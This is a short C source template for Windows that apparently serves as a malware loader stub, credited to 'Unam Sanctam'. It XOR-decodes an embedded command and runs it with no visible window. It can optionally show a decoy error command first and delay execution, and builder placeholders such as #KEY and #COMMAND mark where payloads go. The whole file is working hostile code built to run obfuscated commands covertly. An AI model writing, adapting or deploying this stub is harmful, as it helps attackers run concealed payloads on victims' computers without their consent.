#include <windows.h>

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

char* cipher(char* data, int dataLen) {
	char* key = "#KEY";
	int keyLen = strlen(key);
	char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; ++i) {
		output[i] = data[i] ^ key[i % keyLen];
	}
	return output;
}

int run_program(char* file, char* arguments){
	PROCESS_INFORMATION p_info;
	STARTUPINFO s_info;

	memset(&s_info, 0, sizeof(s_info));
	memset(&p_info, 0, sizeof(p_info));
	s_info.cb = sizeof(s_info); 

	if(CreateProcess(file, arguments, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info)){
		CloseHandle(p_info.hProcess);
		CloseHandle(p_info.hThread);
		return 1;
	}
	return 0;
}

int main(int argc, char **argv) 
{
#if DefError
	run_program(NULL, cipher("#ERRORCOMMAND", #ERRORCOMMANDLENGTH));
#endif
#if DefDelay
	sleep(#DELAY * 1000);
#endif
	run_program(NULL, cipher("#COMMAND", #LENGTH));
	return 0;
}